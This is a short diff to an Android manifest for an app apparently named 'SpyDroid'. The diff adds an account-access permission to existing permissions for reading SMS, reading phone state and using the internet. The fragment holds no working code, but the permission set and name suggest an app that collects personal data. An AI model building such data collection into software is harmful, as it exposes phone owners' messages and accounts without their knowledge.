@@ -6,7 +6,7 @@
 <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
 <uses-permission android:name="android.permission.INTERNET"></uses-permission>
 <uses-permission android:name="android.permission.READ_SMS"></uses-permission>
-
+<uses-permission android:name="android.permission.GET_ACCOUNTS"></uses-permission>
 
     <application android:label="@string/app_name" android:icon="@drawable/ic_launcher_spydroid">
         <activity android:name=".SpyDroid"
